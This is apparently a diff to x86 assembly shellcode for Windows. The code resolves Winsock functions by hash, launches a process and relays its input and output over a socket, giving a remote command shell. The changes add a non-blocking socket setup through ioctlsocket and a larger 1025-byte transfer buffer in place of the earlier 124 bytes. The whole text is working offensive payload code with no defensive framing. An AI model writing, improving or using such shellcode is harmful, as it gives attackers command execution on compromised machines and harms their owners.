@@ -25,28 +25,37 @@ push eax
 call edi                          ; LoadLibraryA("ws2_32")
 push eax
 push eax
+push eax
 HASH push, 'recv'                 ; recv
 call esi                          ; LGetProcAddress('recv', "ws2_32")
 xchg eax, edi                     ; save recv in edi
 HASH push, 'send'                 ; send
-call esi                          ; LGetProcAddress('recv', "ws2_32")
+call esi                          ; LGetProcAddress('send', "ws2_32")
+xchg eax, ebp                     ; save send in ebp
+HASH push, 'ioctlsocket'          ; ioctlsocket
+call esi                          ; LGetProcAddress('ioctlsocket', "ws2_32")
+push eax                          ; push ioctlsocket
 push edi                          ; push recv
-push eax                          ; push send
+push ebp                          ; push send
 
 sub esp, 16                       ; make room for handles
                                   ; pipe1 write, pipe1 read, pipe2 write, read
 mov ebp, esp
 
-%define DATA_SOCKET [ebp + 36]
-%define DATA_KBASE  [ebp + 32]
-%define FN_GETPROC  [ebp + 28]
-%define FN_LOADLIB  [ebp + 24]
-%define FN_RECV     [ebp + 20]
-%define FN_SEND     [ebp + 16]
-; [ebp + 36] = socket
-; [ebp + 32] = kernel32.dll base
-; [ebp + 28] = LGetProcAddress
-; [ebp + 24] = LoadLibraryA
+%define DATA_FIONBIO   0x8004667e
+
+%define DATA_SOCKET    [ebp + 40]
+%define DATA_KBASE     [ebp + 36]
+%define FN_GETPROC     [ebp + 32]
+%define FN_LOADLIB     [ebp + 28]
+%define FN_IOCTLSOCKET [ebp + 24]
+%define FN_RECV        [ebp + 20]
+%define FN_SEND        [ebp + 16]
+; [ebp + 40] = socket
+; [ebp + 36] = kernel32.dll base
+; [ebp + 32] = LGetProcAddress
+; [ebp + 28] = LoadLibraryA
+; [ebp + 24] = ioctlsocket
 ; [ebp + 20] = recv
 ; [ebp + 16] = send
 ; [ebp + 12] = Pipe2 ReadHandle
@@ -144,9 +153,18 @@ LCreateProcessA:
   call FN_GETPROC
   call eax                        ; CreateProcessA()
 
-  add esp, -128                   ; make buffer space (124 char, 4 numRead)
-  mov ecx, esp
-  pop eax
+set_nonblocking:
+  mov eax, DATA_FIONBIO           ; FIONBIO
+  push eax                        ; argp
+  push esp                        ; argp ptr
+  push eax                        ; cmd
+  push DWORD DATA_SOCKET          ; socket
+  call FN_IOCTLSOCKET             ; ioctlsocket(socket, FIONBIO, on)
+
+make_buffer:
+  mov ah, 0x04                    ; 1024 + 1 = 1025
+  xchg eax, esi                   ; save length into esi
+  sub esp, esi                    ; make buffer space
   mov edi, esp
 
 piper_loop:
@@ -185,7 +203,7 @@ read_stdout:                      ; read on pipe2
   mov ecx, esp                    ; numRead ptr
   push eax                        ; lpOverlapped (0)
   push ecx                        ; numRead
-  push BYTE 124                   ; numToRead
+  push esi                        ; numToRead
   push edi                        ; buffer
   push DWORD [ebp + 12]           ; Pipe2 ReadHandle
   push ebx                        ; kernel32 base
@@ -211,7 +229,7 @@ send_client:
 
 recv_client:
   push eax                        ; flags
-  push BYTE 124                   ; len
+  push esi                        ; len
   push edi                        ; buffer
   push DWORD DATA_SOCKET          ; socket
   call FN_RECV                    ; recv()
